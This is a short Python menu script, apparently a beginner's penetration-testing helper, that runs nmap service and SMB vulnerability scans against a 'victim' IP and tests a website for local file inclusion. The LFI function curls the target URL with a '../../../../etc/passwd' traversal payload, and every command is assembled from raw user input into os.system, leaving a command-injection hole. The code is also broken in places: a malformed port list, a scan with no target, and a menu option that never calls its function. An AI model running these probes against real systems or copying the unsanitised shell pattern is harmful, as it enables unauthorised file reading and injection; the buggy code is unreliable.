#!/usr/bin/python3

#libraries
import subprocess, os, os.path

HS_directory = "./HS"

os.mkdir(HS_directory)


def nmap():
    print("Running TCP nmap scan")
    nmap_directory="./HS/nmap"
    os.mkdir(nmap_directory)
    os.chdir(nmap_directory)
    vhost = input("Please enter the victim's IP address: ")
    os.system("nmap -sC -sV " + vhost + "| tee nmap.nmap")

def nmapEnum():
    print("Checking if SMB is vulnerable")
    nSMB="./HS/n-smb"
    os.mkdir(nSMB)
    os.chdir(nSMB)
    os.system("nmap --script smb-vuln* -p 137,139.445")

def apacheVUL():
    print("Checking for LFI Vulnerability")
    website=input("Please enter the website excluding the potential vulnerable page. (e.g) http://10.11.1.35/section.php?page= ")
    etcpw= "../../../../../../../../etc/passwd"
    os.system("curl " + website + etcpw)

def main():

    choice ='0'
    while choice =='0':
        print("Main Choice: Choose 1 of 5 choices")
        print("Choose 1 for tcp nmap scan")
        print("Choose 2 for apache vulnerability checks")
        print("Choose 3 to enumerate with nmap")
        print("Choose 4 for something")
        print("Choose 5 to go to another menu")

        choice = input ("Please make a choice: ")

        if choice == "5":
            print("Go to another menu")
            second_menu()
        elif choice == "4":
            print("Do Something 4")
        elif choice == "3":
            nmapEnum
        elif choice == "2":
            apacheVUL()
        elif choice == "1":
            nmap()
        else:
            print("I don't understand your choice.")

def second_menu():
    print("This is the second menu")

main()
os.rmdir(HS_directory)